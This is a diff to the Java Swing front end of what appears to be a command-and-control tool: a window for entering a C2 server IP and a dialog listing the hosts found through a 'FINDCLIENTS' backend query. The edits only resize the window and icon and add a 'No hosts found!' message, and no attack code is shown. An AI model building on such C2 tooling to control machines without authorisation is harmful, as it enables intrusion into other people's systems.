@@ -21,12 +21,12 @@ public class MainUI extends JFrame{
         setContentPane(mainPanel);
         setDefaultCloseOperation(EXIT_ON_CLOSE);
         setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/resources/SwaminHolder.png")));
-        setSize(300,300);
+        setSize(300,250);
         setLocationRelativeTo(null);
         setTitle("Enter IP");
         setResizable(false);
         setVisible(true);
-        enterC2IPLabel.setIcon(new ImageIcon(new ImageIcon(getClass().getResource("/resources/SwaminHolder_Comp.png")).getImage().getScaledInstance(130, 130, Image.SCALE_REPLICATE)));
+        enterC2IPLabel.setIcon(new ImageIcon(new ImageIcon(getClass().getResource("/resources/SwaminHolder_Comp.png")).getImage().getScaledInstance(100, 100, Image.SCALE_REPLICATE)));
         ipEnterButton.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
@@ -42,7 +42,8 @@ public class MainUI extends JFrame{
                     fetchedIPs = apiHandle.queryBackend("FINDCLIENTS", "", 3);
                     //JOptionPane.showMessageDialog(null, "Machines found:\n"+fetchedIPs);
                     //JOptionPane.showMessageDialog(null, "Machines found:\n"+fetchedIPs, "Found machines", JOptionPane.INFORMATION_MESSAGE,new ImageIcon(new ImageIcon("SwaminHolder.png").getImage().getScaledInstance(100, 100, Image.SCALE_DEFAULT)));
-                    new CustomDialog(fetchedIPs.split("\n").length+" hosts found\n"+fetchedIPs, "Found machines", "Cross.png");
+                    String bootDialog = fetchedIPs.split("\n").length > 1 ? fetchedIPs.split("\n").length+" hosts found\n"+fetchedIPs : "No hosts found!";
+                    new CustomDialog(bootDialog, "Found machines", "Cross.png");
                     new MenuForm(apiHandle);
                     MainUI.this.setVisible(false);
                 } catch (IOException | InterruptedException | IllegalArgumentException ex) {
